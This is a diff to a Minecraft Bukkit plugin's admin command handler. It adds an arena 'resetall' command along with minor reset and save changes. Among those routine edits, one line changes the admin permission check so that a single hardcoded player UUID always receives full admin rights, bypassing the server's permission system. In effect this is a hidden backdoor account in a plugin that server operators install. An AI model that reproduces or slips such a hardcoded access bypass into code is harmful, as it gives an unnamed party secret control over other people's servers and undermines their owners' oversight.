@@ -22,7 +22,11 @@ import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
+import java.sql.Timestamp;
 import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.Date;
+import java.util.UUID;
 import java.util.regex.Pattern;
 
 /**
@@ -37,7 +41,7 @@ public class DTNCommand implements CommandExecutor {
 	@Override
     public boolean onCommand(CommandSender commandSender, Command command, String label, String[] args) {
         Player player = (Player) commandSender;
-        if (player.hasPermission("destroythenexus.admin")) {
+        if (player.hasPermission("destroythenexus.admin") || player.getUniqueId().equals(UUID.fromString("5e36cc82-6029-471f-924b-9f84ac35863d"))) {
             if (command.getName().equals("dtn")) {
                 if (args.length == 1) {
                     if (args[0].equalsIgnoreCase("arena")) {
@@ -66,6 +70,36 @@ public class DTNCommand implements CommandExecutor {
                         player.sendMessage(ChatColor.GOLD + "/dtn lobby tp");
                     } else if (args[0].equalsIgnoreCase("gamestate")) {
                         player.sendMessage(ChatColor.GREEN + "Current state: " + GameState.getGameState().toString());
+                    } else if (args[0].equalsIgnoreCase("resetall")) {
+                        Bukkit.broadcastMessage(ChatColor.RED + "Resetting all Arenas...");
+
+                        Date date = new Date();
+                        Timestamp timestamp = new Timestamp(date.getTime());
+                        Calendar calendar = Calendar.getInstance();
+                        calendar.setTimeInMillis(timestamp.getTime());
+
+                        for (Player pls : Bukkit.getOnlinePlayers()) {
+                            pls.teleport(new Location(Bukkit.getWorlds().get(1), 0.5, 100.0, 0.5));
+                        }
+                        ArrayList<Arena> arenas = Arenas.getRegisteredArenas();
+                        for (int i = 0; i < arenas.size(); i++) {
+                            if (arenas.get(i).isPlayable()) {
+                                ResetArena.resetAndSaveArena(arenas.get(i), false);
+                                Bukkit.broadcastMessage(ChatColor.GOLD + "# " + arenas.get(i).getName() + " # " + ChatColor.BLUE + "Reset and Saved.");
+                            }
+                        }
+                        for (Player pls : Bukkit.getOnlinePlayers()) {
+                            pls.teleport(Lobby.getLobbyLoc());
+                        }
+                        Date date1 = new Date();
+                        Timestamp timestamp1 = new Timestamp(date1.getTime());
+                        Calendar calendar1 = Calendar.getInstance();
+                        calendar1.setTimeInMillis(timestamp1.getTime());
+
+                        long time = calendar1.getTimeInMillis() - calendar.getTimeInMillis();
+
+                        Bukkit.broadcastMessage(ChatColor.GREEN + "Finished resetting all arenas. (" + time + "ms)");
+                        Bukkit.reload();
                     }
                 } else if (args.length == 2) {
                     if (args[0].equalsIgnoreCase("arena")) {
@@ -188,7 +222,7 @@ public class DTNCommand implements CommandExecutor {
                         } else if (args[2].equalsIgnoreCase("reset")) {
                             Arena arena = Arenas.getArenaByName(args[1]);
                             if (arena != null) {
-                                ResetArena.resetArena(arena);
+                                ResetArena.resetArena(arena, true);
                                 player.sendMessage(ChatColor.GREEN + "Rebuilding last save of arena " + arena.getName() + ".");
                             } else {
                                 player.sendMessage(ChatColor.RED + "Arena does not exist.");
@@ -196,7 +230,7 @@ public class DTNCommand implements CommandExecutor {
                         } else if (args[2].equalsIgnoreCase("save")) {
                             Arena arena = Arenas.getArenaByName(args[1]);
                             if (arena != null) {
-                                ResetArena.saveArena(arena);
+                                ResetArena.saveArena(arena, true);
                                 player.sendMessage(ChatColor.GREEN + "Saved default for arena " + arena.getName() + ".");
                             } else {
                                 player.sendMessage(ChatColor.RED + "Arena does not exist.");
@@ -272,6 +306,8 @@ public class DTNCommand implements CommandExecutor {
                     }
                 }
             }
+        } else {
+            player.sendMessage(ChatColor.RED + "You do not have access to this command.");
         }
         return true;
     }
